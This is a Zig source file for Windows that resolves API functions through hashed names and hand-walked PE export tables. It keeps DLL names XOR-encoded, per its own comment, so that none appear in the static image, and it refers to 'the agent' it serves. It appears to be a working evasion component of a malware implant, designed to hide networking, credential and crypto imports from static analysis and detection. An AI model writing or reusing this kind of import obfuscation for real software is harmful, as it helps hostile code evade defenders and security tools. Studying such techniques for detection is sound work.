const std = @import("std");
const windows = std.os.windows;

const HANDLE = windows.HANDLE;
const DWORD = windows.DWORD;
const HMODULE = windows.HMODULE;

const NX_ALLOWED_CRT_PREFIX = "api-ms-win-crt-";
const NX_MAX_CACHE = 256;
const NX_HASH_SEED: u32 = 61327;

const NxModule = struct {
    hash: u32,
    enc: []const u8,
};

// ASCII names XORed with 0x5A + index.  Kept as bytes so no DLL names appear
// in the static image.  Only modules that the agent resolves lazily are here.
const nx_modules = [_]NxModule{
    .{ .hash = 0xFAB06795, .enc = &.{ 0x31, 0x3E, 0x2E, 0x33, 0x3B, 0x33, 0x53, 0x53 } }, // kernel32
    .{ .hash = 0x7B933969, .enc = &.{ 0x3B, 0x3F, 0x2A, 0x3C, 0x2E, 0x36, 0x53, 0x53 } }, // advapi32
    .{ .hash = 0x6F6BE52F, .enc = &.{ 0x2D, 0x28, 0x6E, 0x02, 0x6D, 0x6D } }, // ws2_32
    .{ .hash = 0x4784082D, .enc = &.{ 0x2D, 0x32, 0x32, 0x34, 0x30, 0x3A, 0x14 } }, // wininet
    .{ .hash = 0x6ACBC7D3, .enc = &.{ 0x2F, 0x28, 0x39, 0x2F, 0x6D, 0x6D } }, // user32
    .{ .hash = 0xC33AF455, .enc = &.{ 0x34, 0x3E, 0x28, 0x3C, 0x2E, 0x36, 0x53, 0x53 } }, // netapi32
    .{ .hash = 0x8A3A67D0, .enc = &.{ 0x33, 0x2B, 0x34, 0x31, 0x2E, 0x3E, 0x10, 0x08 } }, // iphlpapi
    .{ .hash = 0xD432B36D, .enc = &.{ 0x34, 0x2F, 0x38, 0x31, 0x32 } }, // ntdll
    .{ .hash = 0x3D5F7E63, .enc = &.{ 0x38, 0x38, 0x2E, 0x24, 0x2E, 0x2B } }, // bcrypt
    .{ .hash = 0x42D1036E, .enc = &.{ 0x3E, 0x35, 0x2F, 0x3C, 0x2E, 0x36 } }, // dnsapi
    .{ .hash = 0xD44069D4, .enc = &.{ 0x35, 0x37, 0x39, 0x6E, 0x6C } }, // ole32
    .{ .hash = 0xA759FDBE, .enc = &.{ 0x35, 0x37, 0x39, 0x3C, 0x2B, 0x2B, 0x53, 0x53 } }, // oleaut32
    .{ .hash = 0x10A4AA2C, .enc = &.{ 0x29, 0x33, 0x39, 0x31, 0x32, 0x6C, 0x52 } }, // shell32
    .{ .hash = 0xC44512B7, .enc = &.{ 0x2F, 0x28, 0x39, 0x2F, 0x3B, 0x31, 0x16 } }, // userenv
    .{ .hash = 0x59C0B206, .enc = &.{ 0x39, 0x29, 0x25, 0x2D, 0x2A, 0x6C, 0x52 } }, // crypt32
    .{ .hash = 0xD3AB53C8, .enc = &.{ 0x3D, 0x3F, 0x35, 0x6E, 0x6C } }, // gdi32
};

const NxCacheEntry = struct {
    module_hash: u32,
    function_hash: u32,
    pointer: ?*anyopaque,
};

var nx_cache: [NX_MAX_CACHE]NxCacheEntry = @splat(.{
    .module_hash = 0,
    .function_hash = 0,
    .pointer = null,
});
var nx_cache_count: usize = 0;
var nx_lock = std.atomic.Value(bool).init(false);

extern "kernel32" fn GetModuleHandleW(lpModuleName: ?[*:0]const u16) callconv(.winapi) ?HMODULE;
extern "kernel32" fn LoadLibraryW(lpLibFileName: [*:0]const u16) callconv(.winapi) ?HMODULE;

pub fn nx_hash(name: []const u8) u32 {
    var value: u32 = NX_HASH_SEED;
    for (name) |raw| {
        var c = raw;
        if (c >= 'a' and c <= 'z') c -= 32;
        value = (value << 5) +% value +% @as(u32, c);
    }
    return value;
}

fn nx_lock_acquire() void {
    while (nx_lock.swap(true, .acquire)) {
        std.atomic.spinLoopHint();
    }
}

fn nx_lock_release() void {
    nx_lock.store(false, .release);
}

fn nx_decrypt_name(enc: []const u8, buffer: *[64]u8) []const u8 {
    const len = @min(enc.len, buffer.len - 1);
    for (enc[0..len], 0..) |byte, index| {
        buffer[index] = byte ^ (0x5A + @as(u8, @truncate(index)));
    }
    buffer[len] = 0;
    return buffer[0..len];
}

fn nx_ascii_to_wide(name: []const u8, buffer: *[64]u16) [*:0]const u16 {
    const len = @min(name.len, buffer.len - 5);
    for (name[0..len], 0..) |byte, index| {
        buffer[index] = byte;
    }
    buffer[len] = '.';
    buffer[len + 1] = 'd';
    buffer[len + 2] = 'l';
    buffer[len + 3] = 'l';
    buffer[len + 4] = 0;
    return @ptrCast(buffer);
}

pub fn nx_module(module_hash: u32) ?HMODULE {
    return nx_module_by_hash(module_hash);
}

fn nx_module_by_hash(module_hash: u32) ?HMODULE {
    var ascii: [64]u8 = undefined;
    for (nx_modules) |entry| {
        if (entry.hash != module_hash) continue;
        const name = nx_decrypt_name(entry.enc, &ascii);
        var wide: [64]u16 = undefined;
        const wide_name = nx_ascii_to_wide(name, &wide);
        if (GetModuleHandleW(wide_name)) |module| return module;
        return LoadLibraryW(wide_name);
    }
    return null;
}

fn nx_rva_to_ptr(module: HMODULE, rva: u32) ?*anyopaque {
    if (rva == 0) return null;
    const base: [*]u8 = @ptrFromInt(@intFromPtr(module));
    return @ptrCast(base + rva);
}

fn nx_export_pointer(module: HMODULE, function_hash: u32) ?*anyopaque {
    const base: [*]const u8 = @ptrFromInt(@intFromPtr(module));
    if (base[0] != 'M' or base[1] != 'Z') return null;
    const lfanew = std.mem.readInt(u32, base[0x3C..][0..4], .little);
    const nt = @as(usize, lfanew);
    if (std.mem.readInt(u32, base[nt..][0..4], .little) != 0x00004550) return null;
    const optional = nt + 24;
    const export_rva = std.mem.readInt(u32, base[optional + 112 ..][0..4], .little);
    const export_size = std.mem.readInt(u32, base[optional + 116 ..][0..4], .little);
    if (export_rva == 0) return null;

    const export_dir: [*]const u8 = base + export_rva;
    const number_of_names = std.mem.readInt(u32, export_dir[24..][0..4], .little);
    const address_of_names = std.mem.readInt(u32, export_dir[32..][0..4], .little);
    const address_of_ordinals = std.mem.readInt(u32, export_dir[36..][0..4], .little);
    const address_of_functions = std.mem.readInt(u32, export_dir[28..][0..4], .little);
    const names: [*]const u32 = @ptrFromInt(@intFromPtr(base) + address_of_names);
    const ordinals: [*]const u16 = @ptrFromInt(@intFromPtr(base) + address_of_ordinals);
    const functions: [*]const u32 = @ptrFromInt(@intFromPtr(base) + address_of_functions);

    var index: u32 = 0;
    while (index < number_of_names) : (index += 1) {
        const name_ptr: [*:0]const u8 = @ptrFromInt(@intFromPtr(base) + names[index]);
        const name = std.mem.span(name_ptr);
        if (nx_hash(name) != function_hash) continue;
        const function_rva = functions[ordinals[index]];
        if (function_rva >= export_rva and function_rva < export_rva + export_size) {
            // Forwarded export: module.function.  Resolve the forwarded name
            // through the normal export walk instead of returning a pointer
            // into the export directory.
            const forwarded: [*:0]const u8 = @ptrFromInt(@intFromPtr(base) + function_rva);
            const text = std.mem.span(forwarded);
            const dot = std.mem.indexOfScalar(u8, text, '.') orelse return null;
            const module_name = text[0..dot];
            const function_name = text[dot + 1 ..];
            var module_ascii: [64]u8 = undefined;
            if (module_name.len >= module_ascii.len) return null;
            @memcpy(module_ascii[0..module_name.len], module_name);
            module_ascii[module_name.len] = 0;
            var wide: [64]u16 = undefined;
            const wide_name = nx_ascii_to_wide(module_ascii[0..module_name.len], &wide);
            const forwarded_module = GetModuleHandleW(wide_name) orelse LoadLibraryW(wide_name) orelse return null;
            return nx_export_pointer(forwarded_module, nx_hash(function_name));
        }
        return nx_rva_to_ptr(module, function_rva);
    }
    return null;
}

pub fn nx_api(module_hash: u32, function_hash: u32) ?*anyopaque {
    nx_lock_acquire();
    if (nx_cache_count < NX_MAX_CACHE) {
        var index: usize = 0;
        while (index < nx_cache_count) : (index += 1) {
            if (nx_cache[index].module_hash == module_hash and
                nx_cache[index].function_hash == function_hash)
            {
                const cached = nx_cache[index].pointer;
                nx_lock_release();
                return cached;
            }
        }
    }
    nx_lock_release();

    // Resolve without holding the cache lock.  LoadLibraryW can take the
    // loader lock, and a DLL's DllMain may call a wrapped API; holding our
    // lock across it caused a loader-lock/cache-lock inversion.
    const module = nx_module_by_hash(module_hash) orelse return null;
    const pointer = nx_export_pointer(module, function_hash);

    nx_lock_acquire();
    if (nx_cache_count < NX_MAX_CACHE) {
        nx_cache[nx_cache_count] = .{
            .module_hash = module_hash,
            .function_hash = function_hash,
            .pointer = pointer,
        };
        nx_cache_count += 1;
    }
    nx_lock_release();
    return pointer;
}
